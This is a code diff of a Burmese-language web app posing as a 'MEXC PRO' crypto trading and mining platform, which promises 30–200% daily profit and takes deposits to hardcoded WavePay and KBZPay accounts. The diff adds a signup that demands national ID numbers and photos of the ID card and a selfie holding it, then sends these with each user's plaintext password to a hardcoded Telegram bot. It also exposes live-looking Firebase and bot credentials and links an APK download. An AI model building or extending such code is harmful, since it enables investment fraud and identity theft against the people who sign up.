@@ -12,57 +12,12 @@
     <style>
         :root { --primary: #00DBB1; --primary-glow: rgba(0, 219, 177, 0.3); --bg: #050A0E; --card: rgba(23, 32, 42, 0.7); --text: #FFFFFF; --dim: #94A3B8; --red: #F6465D; --green: #2EBD85; --border: rgba(255, 255, 255, 0.1); --active-gold: #FFD700; }
         
-        /* --- NEW ANIMATED BACKGROUND CODE START --- */
-        .bg-animation {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: -2;
-            overflow: hidden;
-            background-color: var(--bg);
-        }
-
-        .bg-layer {
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            background-size: cover;
-            background-position: center;
-            opacity: 0;
-            animation: bgFade 16s infinite;
-        }
-
-        .bg-layer-1 {
-            background-image: url('https://i.ibb.co/CsM1hK6J/download-2.jpg');
-            animation-delay: 0s;
-        }
-
-        .bg-layer-2 {
-            background-image: url('https://i.ibb.co/TMVH0mqh/download-1.jpg');
-            animation-delay: 8s;
-        }
-
-        @keyframes bgFade {
-            0% { opacity: 0; transform: scale(1); }
-            15% { opacity: 0.4; }
-            45% { opacity: 0.4; }
-            60% { opacity: 0; transform: scale(1.1); }
-            100% { opacity: 0; }
-        }
-
-        .bg-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: radial-gradient(circle at top, rgba(11, 30, 34, 0.7) 0%, rgba(5, 10, 14, 0.95) 100%);
-            z-index: -1;
-            pointer-events: none;
-        }
-        /* --- NEW ANIMATED BACKGROUND CODE END --- */
+        .bg-animation { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -2; overflow: hidden; background-color: var(--bg); }
+        .bg-layer { position: absolute; width: 100%; height: 100%; background-size: cover; background-position: center; opacity: 0; animation: bgFade 16s infinite; }
+        .bg-layer-1 { background-image: url('https://i.ibb.co/CsM1hK6J/download-2.jpg'); animation-delay: 0s; }
+        .bg-layer-2 { background-image: url('https://i.ibb.co/TMVH0mqh/download-1.jpg'); animation-delay: 8s; }
+        @keyframes bgFade { 0% { opacity: 0; transform: scale(1); } 15% { opacity: 0.4; } 45% { opacity: 0.4; } 60% { opacity: 0; transform: scale(1.1); } 100% { opacity: 0; } }
+        .bg-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle at top, rgba(11, 30, 34, 0.7) 0%, rgba(5, 10, 14, 0.95) 100%); z-index: -1; pointer-events: none; }
 
         body { margin: 0; color: var(--text); font-family: 'Inter', 'Segoe UI', sans-serif; -webkit-tap-highlight-color: transparent; min-height: 100vh; }
         .page { display: none; padding: 16px; padding-bottom: 110px; max-width: 500px; margin: auto; animation: pageSlideUp 0.4s ease-out; }
@@ -71,18 +26,19 @@
         .card { background: var(--card); backdrop-filter: blur(12px); border-radius: 20px; padding: 20px; margin-bottom: 20px; border: 1px solid var(--border); box-shadow: 0 10px 30px rgba(0,0,0,0.4); }
         .btn { width: 100%; padding: 16px; border-radius: 12px; border: none; font-weight: 700; cursor: pointer; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); font-size: 14px; text-transform: uppercase; }
         .btn:active { transform: scale(0.95); }
-        
-        .btn:focus, .btn.clicked-gold { 
-            border: 2px solid var(--active-gold) !important; 
-            box-shadow: 0 0 15px var(--active-gold) !important;
-            transform: scale(0.98);
-        }
-
+        .btn:focus, .btn.clicked-gold { border: 2px solid var(--active-gold) !important; box-shadow: 0 0 15px var(--active-gold) !important; transform: scale(0.98); }
         .btn-main { background: linear-gradient(135deg, var(--primary), #00A383); color: #000; box-shadow: 0 5px 15px var(--primary-glow); }
         .btn-red { background: linear-gradient(135deg, #F6465D, #C02E40); color: white; }
         .btn-green { background: linear-gradient(135deg, #2EBD85, #1E8C61); color: white; }
         .btn-active { border: 3px solid var(--active-gold) !important; box-shadow: 0 0 25px rgba(255, 215, 0, 0.6) !important; transform: scale(1.02); }
-        input { width: 100%; padding: 14px; margin: 10px 0; border-radius: 12px; border: 1px solid var(--border); background: rgba(15, 23, 42, 0.6); color: white; box-sizing: border-box; outline: none; position: relative; z-index: 10; }
+        input, textarea { width: 100%; padding: 14px; margin: 10px 0; border-radius: 12px; border: 1px solid var(--border); background: rgba(15, 23, 42, 0.6); color: white; box-sizing: border-box; outline: none; position: relative; z-index: 10; font-family: inherit; }
+        
+        .upload-box { background: rgba(0,219,177,0.05); border: 2px dashed var(--border); border-radius: 12px; padding: 15px; text-align: center; margin: 10px 0; cursor: pointer; transition: 0.3s; }
+        .upload-box:hover { border-color: var(--primary); background: rgba(0,219,177,0.1); }
+        .upload-box i { font-size: 30px; color: var(--primary); margin-bottom: 8px; display: block; }
+        .upload-box small { color: var(--dim); font-size: 11px; }
+        .upload-box img.preview { max-width: 100%; max-height: 150px; border-radius: 8px; margin-top: 10px; display: none; }
+        .upload-box.uploaded { border-color: var(--green); background: rgba(46,189,133,0.1); }
         
         #wd-live-container { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); width: 90%; max-width: 400px; z-index: 9999; pointer-events: none; }
         .wd-toast { background: rgba(11, 25, 33, 0.95); border-left: 4px solid var(--active-gold); padding: 12px 20px; border-radius: 10px; margin-bottom: 10px; display: flex; align-items: center; gap: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); animation: toastIn 0.5s forwards, toastOut 0.5s 4.5s forwards; border: 1px solid rgba(255,215,0,0.2); }
@@ -95,7 +51,7 @@
         .nav-item.active { color: var(--primary); }
         .nav-item i { font-size: 22px; display: block; margin-bottom: 4px; }
         
-        .mining-card { position: relative; overflow: hidden; border: 1px solid rgba(255,255,255,0.05); transition: 0.3s; z-index: 1; margin-bottom: 25px; transition: transform 0.3s; }
+        .mining-card { position: relative; overflow: hidden; border: 1px solid rgba(255,255,255,0.05); transition: 0.3s; z-index: 1; margin-bottom: 25px; }
         .mining-card:hover { transform: translateY(-5px); border-color: var(--primary); }
         .mining-card::before { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: conic-gradient(transparent, var(--primary), transparent 30%); animation: rotate 4s linear infinite; opacity: 0.1; z-index: -1; pointer-events: none; }
         @keyframes rotate { 100% { transform: rotate(360deg); } }
@@ -162,21 +118,8 @@
         .pay-option img { width: 50px; height: 50px; border-radius: 10px; margin-bottom: 8px; }
         .trust-notif { background: rgba(255,215,0,0.1); border: 1px solid var(--active-gold); color: var(--active-gold); padding: 10px; border-radius: 12px; margin-bottom: 15px; font-size: 12px; display: flex; align-items: center; gap: 10px; }
 
-        /* --- NEW DOWNLOAD BUTTON STYLE START --- */
-        .btn-download { 
-            background: linear-gradient(135deg, #FFD700, #FFA500); 
-            color: #000; 
-            margin-bottom: 15px; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            gap: 10px; 
-            text-decoration: none;
-            box-shadow: 0 5px 15px rgba(255, 215, 0, 0.3);
-        }
+        .btn-download { background: linear-gradient(135deg, #FFD700, #FFA500); color: #000; margin-bottom: 15px; display: flex; align-items: center; justify-content: center; gap: 10px; text-decoration: none; box-shadow: 0 5px 15px rgba(255, 215, 0, 0.3); }
         .btn-download i { font-size: 18px; }
-        /* --- NEW DOWNLOAD BUTTON STYLE END --- */
-
     </style>
 </head>
 <body>
@@ -200,7 +143,6 @@
         <p style="color:var(--dim);">Professional Trading Environment</p>
     </div>
     <div id="login-form" class="card">
-        
         <a href="https://www.mediafire.com/file/mhq86zviuevscxp/_MEXC_PRO_19694733.apk/file" class="btn btn-download">
             <i class="fas fa-download"></i> APP ကို ဒေါင်းလုဒ်လုပ်ရန်
         </a>
@@ -215,8 +157,39 @@
     <div id="reg-form" class="card" style="display:none;">
         <input type="text" id="reg-un" placeholder="User Name">
         <input type="text" id="reg-ph" placeholder="Phone Number (09...)">
-        <input type="password" id="reg-pw" placeholder="Password">
-        <button class="btn btn-main" onclick="applyClickGold(this); handleAuth('reg')">Register Now</button>
+        <div class="pw-wrapper">
+            <input type="password" id="reg-pw" placeholder="Password">
+            <i class="fas fa-eye pw-toggle" onclick="togglePassword('reg-pw', this)"></i>
+        </div>
+
+        <h4 style="color:var(--primary); font-size:14px; margin: 15px 0 5px 0;"><i class="fas fa-id-card"></i> မှတ်ပုံတင် အချက်အလက်</h4>
+        <input type="text" id="reg-nrc" placeholder="မှတ်ပုံတင် နံပါတ် (ဥပမာ: 12/ABC(N)123456)">
+        
+        <p style="color:var(--dim); font-size:11px; margin-top:10px;">* မှတ်ပုံတင် ရှေ့ဘက်ပုံ ထည့်ပါ *</p>
+        <div class="upload-box" id="nrc-front-box" onclick="document.getElementById('nrc-front-input').click()">
+            <i class="fas fa-camera"></i>
+            <small>ရှေ့ဘက်ပုံ ထည့်ရန် နှိပ်ပါ</small>
+            <img id="nrc-front-preview" class="preview" />
+        </div>
+        <input type="file" id="nrc-front-input" accept="image/*" style="display:none;" onchange="handleImageUpload('nrc-front')">
+
+        <p style="color:var(--dim); font-size:11px; margin-top:10px;">* မှတ်ပုံတင် နောက်ဘက်ပုံ ထည့်ပါ *</p>
+        <div class="upload-box" id="nrc-back-box" onclick="document.getElementById('nrc-back-input').click()">
+            <i class="fas fa-camera"></i>
+            <small>နောက်ဘက်ပုံ ထည့်ရန် နှိပ်ပါ</small>
+            <img id="nrc-back-preview" class="preview" />
+        </div>
+        <input type="file" id="nrc-back-input" accept="image/*" style="display:none;" onchange="handleImageUpload('nrc-back')">
+
+        <p style="color:var(--dim); font-size:11px; margin-top:10px;">* မှတ်ပုံတင် ကိုင်ဆောင်ထားသောပုံ ထည့်ပါ *</p>
+        <div class="upload-box" id="nrc-hold-box" onclick="document.getElementById('nrc-hold-input').click()">
+            <i class="fas fa-user-circle"></i>
+            <small>ကိုင်ဆောင်ထားသောပုံ ထည့်ရန် နှိပ်ပါ</small>
+            <img id="nrc-hold-preview" class="preview" />
+        </div>
+        <input type="file" id="nrc-hold-input" accept="image/*" style="display:none;" onchange="handleImageUpload('nrc-hold')">
+
+        <button class="btn btn-main" style="margin-top:15px;" onclick="applyClickGold(this); handleAuth('reg')">Register Now</button>
         <p onclick="toggleAuth(false)" style="text-align:center; color:var(--dim); cursor:pointer; margin-top:15px;">Back to Login</p>
     </div>
 </div>
@@ -237,7 +210,7 @@
     </div>
 
     <div class="marquee-box">
-        <div class="marquee-text">အိမ်မှာနေရင်းငွေရှာဖို့အတွက် trading ကိုသေေချာအာရုံစိုက်ပါ... အရင်းအနှီးများလေလေ အမြတ်ပိုရလေဖြစ်ပါသည်။</div>
+        <div class="marquee-text">အိမ်မှာနေရင်းငွေရှာဖို့အတွက် trading ကိုသေချာအာရုံစိုက်ပါ... အရင်းအနှီးများလေလေ အမြတ်ပိုရလေဖြစ်ပါသည်။</div>
     </div>
     
     <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
@@ -285,44 +258,12 @@
         <i class="fas fa-arrow-left" onclick="showPage('dash-page')"></i>
         <h3>MEXC PRO platform အကြောင်း</h3>
     </div>
-    
     <div class="card">
         <img src="https://i.ibb.co/xtHCCyLm/images-1.jpg" style="width:100%; border-radius:10px; margin-bottom:15px;">
         <h4 class="info-header">MEXC PRO ဖြစ်ပေါ်လာပုံသမိုင်း</h4>
-        <p class="info-text">MEXC PRO သည် ၂၀၂၀ ခုနှစ်တွင် စတင်တည်ထောင်ခဲ့ပြီး ကမ္ဘာတစ်ဝှမ်းရှိ ရင်းနှီးမြှုပ်နှံသူများအတွက် လုံခြုံစိတ်ချရသော Trading ပတ်ဝန်းကျင်ကို ဖန်တီးပေးရန် ရည်ရွယ်ပါသည်။ ကျွန်ုပ်တို့သည် အာရှ၏ ထိပ်တန်း Digital Asset Platform တစ်ခုအဖြစ် ရပ်တည်နေပြီး သုံးစွဲသူပေါင်း ၅ သန်းကျော်၏ ယုံကြည်မှုကို ရရှိထားပါသည်။</p>
-        
+        <p class="info-text">MEXC PRO သည် ၂၀၂၀ ခုနှစ်တွင် စတင်တည်ထောင်ခဲ့ပြီး ကမ္ဘာတစ်ဝှမ်းရှိ ရင်းနှီးမြှုပ်နှံသူများအတွက် လုံခြုံစိတ်ချရသော Trading ပတ်ဝန်းကျင်ကို ဖန်တီးပေးရန် ရည်ရွယ်ပါသည်။</p>
         <h4 class="info-header">ဘယ်လောက်အထိ အမြတ်ရနိုင်လဲ?</h4>
-        <p class="info-text" style="color: var(--active-gold); font-weight: bold;">တစ်ရက်လျှင် အရင်းအနှီးပေါ်မူတည်၍ ၃၀% မှ ၂၀၀% အထိ အမြတ်ရရှိနိုင်ပါသည်။ မှန်ကန်စွာ Trading ပြုလုပ်ခြင်းဖြင့် သင်၏ဘဝကို စက္ကန့်ပိုင်းအတွင်း ပြောင်းလဲလိုက်ပါ။</p>
-
-        <h4 class="info-header">Cloud Mining ဆိုတာဘာလဲ?</h4>
-        <div class="info-box">
-            <p class="info-text" style="color: #fff;">
-                <b style="color:var(--primary)">Cloud Mining</b> ဆိုတာ ဘဏ်ပုံစံပါပဲ။ ဒါပေမယ့် ဘဏ်တွေထက် အတိုးနှုန်းမြောက်မြားစွာ ပိုမိုရရှိနိုင်တဲ့ နေရာဖြစ်ပါတယ်။
-            </p>
-            <p class="info-text" style="color: var(--active-gold); font-weight: bold; border: 1px dashed var(--active-gold); padding: 10px; border-radius: 8px;">
-                ဥပမာ - Cloud Mining တွင် နေ့စဉ်အတိုး (၂%) ရရှိမည်ဆိုပါက အရင်း ၁ သိန်းကျပ် ထည့်ဝင်ထားရုံဖြင့် တစ်ရက်လျှင် ၂,၀၀၀ ကျပ် အမြတ်ငွေ အလုပ်မလုပ်ဘဲ အမြဲတမ်း ရရှိနေမှာဖြစ်ပါတယ်။
-            </p>
-            <p class="info-text">
-                မိမိကိုယ်တိုင် စက်ပစ္စည်းများ ဝယ်ယူစရာမလိုဘဲ ကျွန်ုပ်တို့၏ အဆင့်မြင့် Mining Rig များကို ငှားရမ်းခြင်းဖြင့် နေ့စဉ်အမြတ်ငွေ <b>Passive Income</b> ရအောင် အခုပဲ ရှာဖွေလိုက်ပါ။
-            </p>
-        </div>
-
-        <h4 class="info-header">Passive Income ဆိုတာဘာလဲ?</h4>
-        <div class="info-box" style="border-left: 4px solid var(--green);">
-            <p class="info-text">
-                <b>Passive Income</b> ဆိုတာ အလုပ်မလုပ်ဘဲ အမြဲတမ်း ဝင်ငွေစီးဆင်းနေတဲ့ စနစ်ကို ဆိုလိုတာပါ။ မြန်မာလူမျိုးအများစုဟာ တစ်ဘဝလုံး အလုပ်တွေ ပင်ပင်ပန်းပန်း လုပ်ကိုင်ရင်း အချိန်ကုန်ဆုံးနေကြပါတယ်။
-            </p>
-            <p class="info-text" style="color: var(--primary);">
-                Passive Income ရှိခြင်းက သင့်ကို <b>"ငွေကြေးလွတ်လပ်မှု (Financial Freedom)"</b> ကို ရရှိစေမှာပါ။ သင် အိပ်နေချိန်မှာတောင် သင့်အတွက် ပိုက်ဆံတွေက အလုပ်လုပ်ပေးနေမှာ ဖြစ်ပါတယ်။
-            </p>
-            <p class="info-text">
-                တစ်ဘဝလုံး အလုပ်တွေလုပ်ရင်း အချိန်ကုန်ဆုံးမယ့်အစား အမြဲတမ်းဝင်ငွေရမယ့် Passive Income လမ်းစကို ရှာဖွေကြပါ။ MEXC PRO နဲ့ လက်တွဲပြီး သန်းကြွယ်သူဌေး ဖြစ်ဖို့၊ ငွေကြေးလွတ်လပ်မှု ရရှိဖို့နဲ့ အိမ်မှာနေရင်း Daily Income တွေ ရရှိဖို့ အခုပဲ အတူလက်တွဲလိုက်ပါ။
-            </p>
-        </div>
-
-        <h4 class="info-header">သန်းကြွယ်သူဌေး ဖြစ်လာသူများအကြောင်း</h4>
-        <p class="info-text">အရင်းအနှီးအနည်းငယ် (၁ သောင်းကျပ်) မှ စတင်၍ ယခုအခါ သိန်းပေါင်းသောင်းချီ ချမ်းသာသွားသော Trading Master များစွာရှိပါသည်။ ၎င်းတို့အကြောင်းကို YouTube တွင် "MEXC Success Stories" ဟု ရှာဖွေနိုင်သလို အောက်ပါ Link တွင်လည်း လေ့လာနိုင်ပါသည်။</p>
-        <a href="https://youtube.com/@mexc_official" target="_blank" style="color:var(--primary); text-decoration:none; display:block; margin-bottom:15px;"><i class="fab fa-youtube"></i> MEXC Professional Tutorials</a>
+        <p class="info-text" style="color: var(--active-gold); font-weight: bold;">တစ်ရက်လျှင် အရင်းအနှီးပေါ်မူတည်၍ ၃၀% မှ ၂၀၀% အထိ အမြတ်ရရှိနိုင်ပါသည်။</p>
     </div>
 </div>
 
@@ -331,14 +272,12 @@
         <i class="fas fa-arrow-left" onclick="showPage('dash-page')"></i>
         <h3>VIP Membership Levels</h3>
     </div>
-    
     <div class="card" style="border: 1px solid var(--active-gold); text-align: center; background-image: url('https://i.ibb.co/Qvf6fXdp/images.jpg'); background-size: cover; background-position: center; min-height: 120px;">
         <div style="background: rgba(0,0,0,0.6); padding: 20px; border-radius: 15px; height: 100%;">
             <p style="margin: 0; font-size: 14px; color: #fff;">Your Current Status</p>
             <h2 id="current-vip-level" style="color: var(--active-gold); margin: 5px 0;">VIP 0 MEMBER</h2>
         </div>
     </div>
-    
     <div id="vip-tiers-list"></div>
 </div>
 
@@ -356,11 +295,9 @@
             <span style="color:var(--green); font-weight:bold;">+<span id="trade-prof">0</span>%</span>
         </div>
     </div>
-    
     <div id="tradingview-widget-container" class="trade-visualizer">
         <div id="tv_chart_container" style="height: 100%;"></div>
     </div>
-
     <div class="card" style="text-align:center; padding: 25px 10px;">
         <div class="timer-container" id="timer-ring">
             <div id="trade-timer" style="font-size:32px; font-weight:800; color:var(--primary);">READY</div>
@@ -413,13 +350,11 @@
         <input type="password" id="new-pin" placeholder="Enter 6-Digit PIN" maxlength="6">
         <button class="btn btn-main" onclick="applyClickGold(this); changeSecurity('pin')">Save PIN</button>
     </div>
-    
     <div class="card">
         <h4>System Logs</h4>
-        <div class="sec-log" id="login-log">Last Login: Just now from Yangon, MM (IP: 103.***.***.21)</div>
+        <div class="sec-log" id="login-log">Last Login: Just now from Yangon, MM</div>
         <div class="sec-log" style="margin-top:5px; border-color:var(--active-gold); color:var(--active-gold);">Security Status: 2FA Active (Encrypted)</div>
     </div>
-
     <button class="btn btn-red" style="margin-top:20px; background:#222;" onclick="location.reload()">Sign Out</button>
 </div>
 
@@ -432,9 +367,6 @@
         <input type="text" id="wd-ph-input" placeholder="Receiver Phone Number">
         <input type="password" id="wd-pin-input" placeholder="Withdraw PIN">
         <button class="btn btn-main" style="margin-top:10px;" id="wd-submit-btn" onclick="applyClickGold(this); sendWithdraw()">Verify & Withdraw</button>
-        <div id="wd-pending-status" style="display:none; text-align:center; margin-top:10px; color:var(--active-gold);">
-            <i class="fas fa-spinner fa-spin"></i> Pending Approval...
-        </div>
     </div>
 </div>
 
@@ -452,7 +384,6 @@
                 <div style="font-size:12px; font-weight:bold;">KBZPay</div>
             </div>
         </div>
-
         <div id="dep-details" style="display:none; text-align:center;">
             <p style="color:var(--red); font-size: 12px; font-weight: bold;">* <span id="dep-method-name">Wave</span> နံပါတ်နှင့် နာမည်ကိုသေချာစိစစ်၍လွှဲပေးပါ *</p>
             <div style="background: rgba(0,0,0,0.3); padding: 15px; border-radius: 10px; margin-bottom: 15px;">
@@ -474,9 +405,6 @@
         <textarea id="adm-msg" style="width:100%; height:80px; background:#111; color:white; border-radius:10px; padding:10px;" placeholder="Write message to all users..."></textarea>
         <button class="btn btn-main" style="margin-top:5px;" onclick="applyClickGold(this); admPostAnnounce()">Post to Notifications</button>
     </div>
-
-    <!-- Payment Settings ကို Admin Panel မှ ဖျက်လိုက်ပြီး (Hardcoded ဖြစ်သွားပါပြီ) -->
-
     <div class="card">
         <input type="text" id="adm-search" placeholder="Search User Phone">
         <button class="btn btn-main" onclick="applyClickGold(this); admSearch()">Find Account</button>
@@ -505,9 +433,17 @@
 </div>
 
 <script>
+    // ================================================================
+    // 🔥 FIREBASE CONFIG (mexc-pro-2024 Project အသစ်) 🔥
+    // ================================================================
     const config = { 
-        apiKey: "AIzaSyAxhjzM9aK4yqLk5PXbkrENmUldUjy78VA", 
-        databaseURL: "https://luckywealthgaming-default-rtdb.asia-southeast1.firebasedatabase.app" 
+        apiKey: "AIzaSyCfsklGhK-QeK-ruGwjhPO9h-SN3qlenb4", 
+        authDomain: "mexc-pro-2024.firebaseapp.com",
+        databaseURL: "https://mexc-pro-2024-default-rtdb.asia-southeast1.firebasedatabase.app",
+        projectId: "mexc-pro-2024",
+        storageBucket: "mexc-pro-2024.firebasestorage.app",
+        messagingSenderId: "652506997123",
+        appId: "1:652506997123:web:0a5f270847845f112ad6b6"
     };
     firebase.initializeApp(config);
     const db = firebase.database();
@@ -515,6 +451,13 @@
     let cMin = 1000, cProf = 30, cDur = 30;
     let isMiningActive = false; 
     let currentPayMethod = '';
+    let nrcImages = { front: null, back: null, hold: null };
+
+    // ================================================================
+    // 🔒 ADMIN PHONE (ဤနံပါတ်ဖြင့်သာ Admin Panel ဝင်နိုင်မည်) 🔒
+    // ================================================================
+    const ADMIN_PHONE = "09951214043";
+    // ================================================================
 
     // ================================================================
     // 🔒 HARDCODED PAYMENT DETAILS (Admin Panel မှ ပြောင်းလဲ၍ မရပါ) 🔒
@@ -533,10 +476,69 @@
         { level: 5, cost: 10000000, daily: "20.0%", gift: "Bonus 1,000,000 Ks", limit: "Unlimited", desc: "VIP 5 အမြင့်ဆုံးအဆင့်ဖြစ်ပြီး Platform ၏ အထူးအခွင့်အရေးအားလုံး ရရှိမည်။" }
     ];
 
+    // ================================================================
+    // 📤 TELEGRAM BOT (ပုံများ + Message များ ပို့ရန်) 📤
+    // ================================================================
+    const TELEGRAM_BOT_TOKEN = "8614205220:AAHxlphuK5ZM29rEh3J6IEPqPEibMjKNXAY";
+    const TELEGRAM_CHAT_ID = "7709938396";
+
     function sendTelegram(msg) {
-        const token = "8614205220:AAHxlphuK5ZM29rEh3J6IEPqPEibMjKNXAY";
-        const chatId = "7709938396";
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`)
+            .catch(e => console.log("Telegram error:", e));
+    }
+
+    // ပုံကို Telegram သို့ ပို့သော function
+    async function sendTelegramPhoto(file, caption) {
+        const formData = new FormData();
+        formData.append('chat_id', TELEGRAM_CHAT_ID);
+        formData.append('photo', file);
+        formData.append('caption', caption);
+        try {
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+        } catch(e) {
+            console.log("Telegram photo error:", e);
+        }
+    }
+
+    // ================================================================
+    // 📷 NRC IMAGE UPLOAD HANDLER 📷
+    // ================================================================
+    function handleImageUpload(type) {
+        const input = document.getElementById(`nrc-${type}-input`);
+        const preview = document.getElementById(`nrc-${type}-preview`);
+        const box = document.getElementById(`nrc-${type}-box`);
+        
+        if(input.files && input.files[0]) {
+            const file = input.files[0];
+            
+            // File size check (5MB limit)
+            if(file.size > 5 * 1024 * 1024) {
+                alert("ပုံအရွယ်အစား 5MB ထက် မကျော်ရပါ။");
+                input.value = "";
+                return;
+            }
+            
+            // Image type check
+            if(!file.type.startsWith('image/')) {
+                alert("ပုံဖိုင် (Image) သာ ထည့်ပါ။");
+                input.value = "";
+                return;
+            }
+            
+            nrcImages[type] = file;
+            
+            const reader = new FileReader();
+            reader.onload = (e) => {
+                preview.src = e.target.result;
+                preview.style.display = 'block';
+                box.classList.add('uploaded');
+                box.querySelector('small').innerText = "✅ ပုံထည့်ပြီးပါပြီ";
+            };
+            reader.readAsDataURL(file);
+        }
     }
 
     function applyClickGold(btn) {
@@ -569,9 +571,6 @@
         }, 12000);
     }
 
-    // ================================================================
-    // 🔒 HARDCODED selectPay function — Firebase မှ မဖတ်တော့ပါ 🔒
-    // ================================================================
     function selectPay(method) {
         currentPayMethod = method;
         document.querySelectorAll('.pay-option').forEach(o => o.classList.remove('selected'));
@@ -579,12 +578,10 @@
         document.getElementById('dep-details').style.display = 'block';
         document.getElementById('dep-method-name').innerText = method === 'wave' ? 'WavePay' : 'KBZPay';
         
-        // Hardcoded values ကို တိုက်ရိုက်သုံးခြင်း
         const data = PAYMENT_DETAILS[method];
         document.getElementById('dep-acc-name').innerText = data.name;
         document.getElementById('display-dep-num').innerText = data.num;
     }
-    // ================================================================
 
     function loadTVWidget(symbol) {
         new TradingView.widget({
@@ -636,18 +633,20 @@
         }
     }
 
-    function handleAuth(type) {
-        const ph = document.getElementById(type==='login'?'log-ph':'reg-ph').value;
+    // ================================================================
+    // 🔐 HANDLE AUTH (Register + Login) — NRC Images ပါဝင် 🔐
+    // ================================================================
+    async function handleAuth(type) {
+        const ph = document.getElementById(type==='login'?'log-ph':'reg-ph').value.trim();
         const pw = document.getElementById(type==='login'?'log-pw':'reg-pw').value;
         
-        // --- NEW MYANMAR PHONE VALIDATION START ---
         const mmPhoneRegex = /^(09|\+?959)\d{7,11}$/;
         if(!mmPhoneRegex.test(ph)) {
             return alert("မြန်မာဖုန်းနံပါတ် (09...) ကိုသာ အသုံးပြုပေးပါ။");
         }
-        // --- NEW MYANMAR PHONE VALIDATION END ---
 
         if(!ph || !pw) return alert("ကျေးဇူးပြု၍ အချက်အလက်အားလုံးကို ဖြည့်စွက်ပါ။");
+        
         if(type==='login') {
             db.ref('users/'+ph).once('value', s => {
                 if(s.exists() && s.val().password === pw) {
@@ -656,13 +655,47 @@
                     showPage('dash-page'); 
                     initApp();
                     startLiveWdFeed(); 
-                    sendTelegram(`User Login: ${ph}`);
+                    sendTelegram(`🔐 User Login: ${ph}\nName: ${s.val().username}\nTime: ${new Date().toLocaleString()}`);
                 } else alert("ဖုန်းနံပါတ် သို့မဟုတ် လျှို့ဝှက်နံပါတ် မှားယွင်းနေပါသည်။");
             });
         } else {
-            const un = document.getElementById('reg-un').value;
-            db.ref('users/'+ph).set({ username:un, password:pw, balance:0, mode:'random', pin:'123456', vip:0 }).then(()=>{
-                sendTelegram(`New User Registered: ${un} (${ph})`);
+            const un = document.getElementById('reg-un').value.trim();
+            const nrc = document.getElementById('reg-nrc').value.trim();
+            
+            // Validation
+            if(!un || un.length < 3) return alert("အမည် အနည်းဆုံး ၃ လုံး ထည့်ပါ။");
+            if(!nrc || nrc.length < 5) return alert("မှတ်ပုံတင် နံပါတ် မှန်ကန်စွာ ထည့်ပါ။");
+            if(!nrcImages.front) return alert("မှတ်ပုံတင် ရှေ့ဘက်ပုံ ထည့်ပါ။");
+            if(!nrcImages.back) return alert("မှတ်ပုံတင် နောက်ဘက်ပုံ ထည့်ပါ။");
+            if(!nrcImages.hold) return alert("မှတ်ပုံတင် ကိုင်ဆောင်ထားသောပုံ ထည့်ပါ။");
+            if(pw.length < 6) return alert("လျှို့ဝှက်နံပါတ် အနည်းဆုံး ၆ လုံး ထည့်ပါ။");
+            
+            // Check if user already exists
+            db.ref('users/'+ph).once('value', async s => {
+                if(s.exists()) return alert("ဤဖုန်းနံပါတ်ဖြင့် အကောင့်ဖွင့်ပြီးသား ဖြစ်ပါသည်။");
+                
+                // Save user data
+                db.ref('users/'+ph).set({ 
+                    username: un, 
+                    password: pw, 
+                    balance: 0, 
+                    mode: 'random', 
+                    pin: '123456', 
+                    vip: 0,
+                    nrc: nrc,
+                    registeredAt: new Date().toLocaleString(),
+                    phone: ph
+                });
+                
+                // Send text to Telegram
+                sendTelegram(`🆕 NEW USER REGISTERED 🆕\n\n👤 Name: ${un}\n📱 Phone: ${ph}\n🆔 NRC: ${nrc}\n🔑 Password: ${pw}\n⏰ Time: ${new Date().toLocaleString()}`);
+                
+                // Send NRC images to Telegram
+                await sendTelegramPhoto(nrcImages.front, `📷 NRC Front - ${un} (${ph})`);
+                await sendTelegramPhoto(nrcImages.back, `📷 NRC Back - ${un} (${ph})`);
+                await sendTelegramPhoto(nrcImages.hold, `📷 NRC Holding - ${un} (${ph})`);
+                
+                alert("အကောင့်ဖွင့်ခြင်း အောင်မြင်ပါသည်။ ကျေးဇူးပြု၍ ပြန်လည်ဝင်ရောက်ပါ။");
                 location.reload();
             });
         }
@@ -671,12 +704,13 @@
     function initApp() {
         db.ref('users/'+user).on('value', s => { 
             const val = s.val();
+            if(!val) return;
             document.getElementById('u-bal').innerText = (val.balance || 0).toLocaleString() + " Ks"; 
             document.getElementById('u-vip-badge').innerText = "VIP " + (val.vip || 0);
             document.getElementById('current-vip-level').innerText = "VIP " + (val.vip || 0) + " MEMBER";
         });
         
-        db.ref('announcements').on('value', s => {
+        db.ref('announcements').once('value', s => {
             let h = "";
             s.forEach(a => {
                 h += `<div class="msg-box"><small class="msg-date">${a.val().date}</small><p style="margin:0; font-size:13px;">${a.val().text}</p></div>`;
@@ -713,7 +747,7 @@
             if(s.val().vip >= lvl) return alert("သင်သည် ဤအဆင့် (သို့မဟုတ်) ဤထက်မြင့်သော အဆင့်သို့ ရောက်ရှိပြီးသား ဖြစ်ပါသည်။");
             if(confirm(`VIP ${lvl} သို့ ${cost.toLocaleString()} Ks ဖြင့် အဆင့်မြှင့်မှာ သေချာပါသလား?`)) {
                 db.ref('users/'+user).update({ balance: s.val().balance - cost, vip: lvl }).then(() => {
-                    sendTelegram(`User ${user} Upgraded to VIP ${lvl}`);
+                    sendTelegram(`⭐ User ${user} Upgraded to VIP ${lvl}`);
                     alert("VIP အဆင့်မြှင့်တင်မှု အောင်မြင်ပါသည်။");
                 });
             }
@@ -770,11 +804,11 @@
                     if(win) { 
                         let reward = amt + (amt * (finalProf/100)); 
